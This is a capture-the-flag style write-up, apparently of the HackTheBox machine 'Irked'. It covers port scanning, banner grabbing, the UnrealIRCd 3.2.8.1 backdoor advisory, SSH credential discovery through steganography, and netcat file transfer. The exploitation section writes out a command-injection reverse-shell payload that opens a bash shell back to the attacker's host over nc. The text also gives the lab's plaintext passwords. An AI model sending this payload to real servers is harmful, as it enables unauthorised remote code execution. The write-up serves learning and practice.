<link href="../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Machine #2<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Irked


<span class="date">Wednesday & Friday, 21 & 23/7/2021</span> 


<br/> 

### <span class="irkedmach subtitle">Could Be Relevant and Could Be Not  
   * ###  <span class="irkedmach subtitle">Nmap
        * Normal Scan    
           ```console
           nmap -Pn 10.10.10.117
           ```
           
           ```console
           PORT    STATE SERVICE
           22/tcp  open  ssh
           80/tcp  open  http
           111/tcp open  rpcbind
           ```
       * Full Scan   
          ```console
          nmap -Pn -p- 10.10.10.117
          ```    
         ```console
         PORT      STATE SERVICE
         22/tcp    open  ssh
         80/tcp    open  http
         111/tcp   open  rpcbind
         6697/tcp  open  ircs-u
         8067/tcp  open  infi-async
         49889/tcp open  unknown
         65534/tcp open  unknown
         ```  
   * ###  <span class="irkedmach subtitle">Banner Grabbing
      * HTTP `p80`
         ```console
         PORT   STATE SERVICE VERSION
         80/tcp open  http    Apache httpd 2.4.10 ((Debian))
         ```
         We now know the version of the http server we have.  

       * RPCBIND `p111`  
         ```console
         PORT    STATE SERVICE VERSION
         111/tcp open  rpcbind 2-4 (RPC #100000)
         ```  
       * SSH `p22`  
         ```console
         PORT   STATE SERVICE VERSION
         22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
         Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
         ```
         I got the version of the OS from this. There could be an exploit for the OS's kernel but not this time.

       * IRC `p6697`  
         ```console
         PORT     STATE SERVICE VERSION
         6697/tcp open  irc     UnrealIRCd
         Service Info: Host: irked.htb
         ```
       * IRC `p8067 & p65534`  
         ```console
         PORT      STATE SERVICE VERSION
         8067/tcp  open  irc     UnrealIRCd
         65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
         Service Info: Host: irked.htb
         ```   
   * ###  <span class="irkedmach subtitle">Searchsploiting Shit      
       * Searchsploiting `rpcbind`  
         Resulted in exploits that are all DoS attacks which are no use to me right now.  

       * Searchsploiting `irc version (UnrealIRCd) `  
         The backdoor listed is the one I used to get into the unreal server   
         ```console
         UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) 
         UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow 
         UnrealIRCd 3.2.8.1 - Remote Downloader/Execute 
         UnrealIRCd 3.x - Remote Denial of Service
         ``` 


<br/><br/> 

### <span class="irkedmach subtitle">Useful Info

* ###  <span class="irkedmach subtitle">Terminologies  
     * What does IRC mean?  
        According to *TRENDMICRO*  

        <blockquote>

        *Internet Relay Chat (IRC) is a network of Internet servers that use a specific protocol through which individuals can hold real-time online conversations via PCs and other devices. Many of today’s botnets utilize IRC to communicate with bot-infected machines.*
        </blockquote>

     * What is rpcbind?  
        The rpcbind utility is a server that converts RPC program numbers
        into universal addresses.  It must be running on the host to be
        able to make RPC calls on a server on that machine.

    * What is a socket?  
      <blockquote>

      *A socket is just a logical endpoint for communication. They exist on the transport layer. You can send and receive things on a socket, you can bind and listen to a socket. A socket is specific to a protocol, machine, and port, and is addressed as such in the header of a packet.*
      </blockquote>  


* ###  <span class="irkedmach subtitle">Web Server  
    * Only found the following page  
    <img src="irked_http.png">
    * We use the image later with `stegsnow` to reveal the steganographed password inside of it.

* ###  <span class="irkedmach subtitle">UnrealIRCD Service  
    * Found this online  
      <blockquote>
      Hi all,

      This is very embarrassing...
      
      We found out that the Unreal3.2.8.1.tar.gz file on our mirrors has been
      replaced quite a while ago with a version with a backdoor (trojan) in
      it. This backdoor allows a person to execute ANY command with the
      privileges of the user running the ircd. The backdoor can be executed
      regardless of any user
      restrictions (so even if you have passworded server or hub that doesn't 
      allow
      any users in).

      It appears the replacement of the .tar.gz occurred in November 2009 (at 
      least on some mirrors). It seems nobody noticed it until now.

      Obviously, this is a very serious issue, and we're taking precautions
      so this will never happen again, and if it somehow does that it will be 
      noticed quickly.
      We will also re-implement PGP/GPG signing of releases. Even though in 
      practice
      (very) few people verify files, it will still be useful for those
      people who do.
      </blockquote>
      <blockquote>
      Safe versions

      The Windows (SSL and non-ssl) versions are NOT affected.

      CVS is also not affected.

      3.2.8 and any earlier versions are not affected.

      Any Unreal3.2.8.1.tar.gz downloaded BEFORE November 10 2009 should be 
      safe, but you should really double-check, see next.

      How to check if you're running the backdoored version
      </blockquote>
      <blockquote>
      Two ways:

      One is to check if the Unreal3.2.8.1.tar.gz you have is good or bad by 
      running 'md5sum Unreal3.2.8.1.tar.gz' on it.
      Backdoored version (BAD) is: 752e46f2d873c1679fa99de3f52a274d
      Official version (GOOD) is: 7b741e94e867c0a7370553fd01506c66

      The other way is to run this command in your Unreal3.2 directory:
      grep DEBUG3_DOLOG_SYSTEM include/struct.h
      If it outputs two lines, then you're running the backdoored/trojanized 
      version.
      If it outputs nothing, then you're safe and there's nothing to do.

      What to do if you're running the backdoored version


      Obviously, you only need to do this if you checked you are indeed 
      running the
      backdoored version, as mentioned above. Otherwise there's no point in 
      continuing, as the version on our website is (now back) the good one 
      from April 13 2009 and nothing 'new'.
      </blockquote>
     * The backdoor exploit that the current UnrealIRCD version is vulnerable to which is, after intiating the connection to the server with `nc` on one of the 3 irc ports `p8067,p65534 & p6697`, we get the following two messages after they're viewed as mentioned before I can write the following and it will get executed
        ```console
        nc -nv 10.10.10.117 8067
        ```  
        ```console
        (UNKNOWN) [10.10.10.117] 8067 (?) open
        :irked.htb NOTICE AUTH :*** Looking up your hostname...
        :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
        AB;nc -nv 10.10.14.8 5555 -e /bin/bash
        ```
        So here the nc will get executed and of course having my machine listening on port 5555 I get remote code execution.


* ###  <span class="irkedmach subtitle">SSH Login  
  * djmardov's password   
    Found a file called `.backup`, obviously hidden, and it had a password (password: UPupDOWNdownLRlrBAbaSSss) that I could use to `stegsnow` the image I found in `/var/www/html` where we find a hidden password in the image (password: Kab6h+m+bbp2J:HG). Mostly, steganography is done on images.   

  * How to connect through SSH    
    ```console
    ssh [USERNAME]@[TARGET IP ADDRESS]
    ```
  * To connect to SSH we will need authenticated credentials.

* ###  <span class="irkedmach subtitle">NetCat  
  * Transferring files using nc  
    * On the listening side (reciever)  
      ```console
      nc -lp [PORT TO RECIEVE FILE ON] > [FILE]
      ```
    * On the sender's side  
      ```console
      nc -w 3 [LISTENING IP ADDRESS] [LISTENING PORT] < [FILE]
      ```

### <span class="irkedmach subtitle">Why I Got Stuck?  

Because I kept searching for something that could help me with an SSH password because I already had the username from the email that was written in the irc version in one of the services.  
I memorized the damn filesystem looking for the right file until I found it.

<br/><br/>

### <span class="irkedmach subtitle">Nice Things I Found in Someone Else's Write Up  
  
